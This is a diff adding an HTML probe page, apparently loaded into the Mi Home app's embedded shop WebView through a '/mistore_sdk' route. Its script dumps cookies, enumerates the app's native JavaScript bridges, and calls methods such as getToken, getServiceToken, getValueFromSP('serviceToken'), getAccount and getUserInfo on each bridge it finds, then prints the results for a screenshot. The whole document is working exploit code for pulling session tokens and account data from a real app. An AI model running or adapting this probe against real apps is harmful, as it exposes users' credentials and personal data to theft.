@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>
+  body{font-family:monospace;padding:10px;background:#fff;color:#000;font-size:13px;line-height:1.5}
+  h3{margin:6px 0}
+  pre{white-space:pre-wrap;word-break:break-all;background:#111;color:#0f0;padding:10px;border-radius:6px;font-size:12px}
+  .h{color:#c00;font-weight:bold}
+  .ok{color:#0a0}
+</style>
+</head>
+<body>
+<h3>/mistore_sdk route → 米家内嵌商城 WebView 桥探测</h3>
+<pre id="o">running...</pre>
+<script>
+var o=document.getElementById("o"), L=[];
+function p(s){L.push(s);o.innerText=L.join("\n");}
+function t(fn){try{return fn();}catch(e){return "ERR:"+e;}}
+
+// ---- 基础信息 ----
+p("[环境]");
+p("UA: "+t(function(){return navigator.userAgent;}));
+p("URL: "+t(function(){return location.href;}));
+p("cookie: "+t(function(){return document.cookie;}));
+
+// ---- 桥枚举 ----
+var NAMES=["_native_interface","micoJsBridge","WebViewJavascriptBridge","WebViewJavascriptBridgeInterface",
+           "mihomeJsBridge","_cloud_video_interface","MJApi","statusBarApi","refreshRefInfo",
+           "recordEventInfo","mihome","mishop","android","ShopBridge","ypbridge"];
+var present=[];
+p("\n[桥存在性 + 方法名]");
+NAMES.forEach(function(n){
+  if(window[n]!==undefined){
+    present.push(n);
+    var keys=t(function(){return Object.keys(window[n]).join(",");});
+    p("✓ "+n+" : "+keys);
+  }
+});
+if(!present.length) p("（未检测到任何桥）");
+
+// ---- 通用：对存在的桥尝试调用常见泄露方法 ----
+var LEAK=["getSettings","isLogin","getLocale","getNetworkType","getActiveIds","getAccount",
+          "getToken","getDeviceList","getAllExpInfo","getCouponResult","getUserInfo",
+          "getUserId","getServiceToken","getValueFromSP","getAppInfo","getDeviceInfo",
+          "call","postMessage","fetch"];
+present.forEach(function(n){
+  p("\n[调用 "+n+" 的泄露方法]");
+  LEAK.forEach(function(m){
+    t(function(){
+      var b=window[n];
+      if(typeof b[m]==="function"){
+        // getValueFromSP 需要两个参数
+        var args=(m==="getValueFromSP")?["serviceToken",""]:(
+                  (m==="call")?["getSettings",null]:null);
+        var r=args?b[m].apply(b,args):b[m]();
+        var rs=(typeof r==="string")?r:JSON.stringify(r);
+        p("  "+m+"() => "+String(rs).slice(0,400));
+      }
+    });
+  });
+});
+
+// ---- WebViewJavascriptBridge 风格（异步）试探 ----
+t(function(){
+  if(window.WebViewJavascriptBridge && typeof window.WebViewJavascriptBridge.callHandler==="function"){
+    p("\n[WebViewJavascriptBridge.callHandler]");
+    ["getSettings","isLogin","getDeviceInfo","getUserInfo","getStoreInfo"].forEach(function(h){
+      try{window.WebViewJavascriptBridge.callHandler(h,{},function(r){p("  cb["+h+"] => "+JSON.stringify(r).slice(0,400));});}catch(e){}
+    });
+  }
+});
+
+p("\n[done] 请截图本页");
+</script>
+</body>
+</html>
